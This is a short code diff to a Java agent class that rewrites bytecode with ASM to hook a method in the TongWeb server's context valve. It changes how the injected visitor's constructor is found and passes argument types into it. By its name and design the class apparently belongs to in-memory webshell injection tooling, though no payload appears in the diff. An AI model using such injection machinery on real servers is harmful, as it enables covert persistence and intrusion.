@@ -21,7 +21,7 @@ public class TongWebContextValveAgentWithAsmInjector implements ClassFileTransfo
     static {
         try {
             Class<?> clazz = Class.forName(getClassName());
-            constructor = clazz.getDeclaredConstructor(MethodVisitor.class);
+            constructor = clazz.getConstructors()[0];
             constructor.setAccessible(true);
         } catch (Exception e) {
             e.printStackTrace();
@@ -62,7 +62,8 @@ public class TongWebContextValveAgentWithAsmInjector implements ClassFileTransfo
                 MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                 if (TARGET_METHOD_NAME.equals(name) && descriptor.endsWith(")V")) {
                     try {
-                        return (MethodVisitor) constructor.newInstance(mv);
+                        Type[] argumentTypes = Type.getArgumentTypes(descriptor);
+                        return (MethodVisitor) constructor.newInstance(mv, argumentTypes);
                     } catch (Exception e) {
                         e.printStackTrace();
                     }
